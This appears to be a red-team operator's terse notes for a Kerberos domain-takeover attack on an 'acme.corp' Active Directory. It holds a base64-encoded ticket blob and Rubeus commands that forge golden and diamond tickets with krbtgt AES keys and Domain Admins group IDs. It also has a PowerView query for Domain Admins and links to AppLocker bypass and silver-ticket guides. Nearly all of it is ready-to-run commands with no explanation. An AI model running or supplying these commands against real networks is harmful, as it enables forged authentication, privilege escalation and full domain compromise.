vfEFBbZcSbU2JTx+Y991YbnMBcpgHe1lzt7qQiPEYe9a1mngkyoK4ZkYPkrDznsmOvCMXl0SbVILpBULLnaI/7RzzdepSwGBlvx1Ge2V565/m/lphshwBYLWpK6ebjh1CJDSF6h58diQ2VhIZ4AyPYp4LUHtFsxP5QOUA8XZ1ZtSIP/M8yMfOh2Ffo/womjMjTAfK4C+x3SflLpZKKww8KHtqoRxxQo7T6Di4F1TRn2VGa64kfP+6bZVZADh0CLK1y6URQpYyIebLB2uznkcnrOlwdWCEyCz1Br/22DuRN3S8YHuXD0LeYlJJhs6n9+kFyeB/IDQ2HUulAeBbDPB2gez+mfnmWyks31JzV1iuWxWqDAPErPgKla6RD7GmnvU+2kJSDhPFySH4HM0dVt4YfymQ05q7m7o4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQggfGzK4SMM93GLRvK9UlyqfppLydXuEhSrXJynblB47ChCxsJQUNNRS5DT1JQohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQKUAAKURGA8yMDI1MDQyNDA4NTIzOFqmERgPMjAyNTA0MjQxODQyNTVapxEYDzIwMjUwNTAxMDg0MjU1WqgLGwlBQ01FLkNPUlCpHzAdoAMCAQGhFjAUGwRob3N0GwxkYy5hY21lLmNvcnA=

```



```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:1f09492242778e62b4777e6259356793d221fc682ed91cdc1b44dd2bd8a7cce6 /user:Administrator /domain:acme.corp /sid:S-1-5-21-951568539-2129440919-2691824384 /nowrap
```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ACME /username:administrator /password:FakePass /ticket:
```




```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:1106 /groups:512 /krbkey:1f09492242778e62b4777e6259356793d221fc682ed91cdc1b44dd2bd8a7cce6 /nowrap
```



```
powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName
```


applocker bypasses:
https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md

https://github.com/GhostPack/Rubeus?tab=readme-ov-file#asktgs

https://hacktricks.boitatech.com.br/windows/active-directory-methodology/silver-ticket





```

```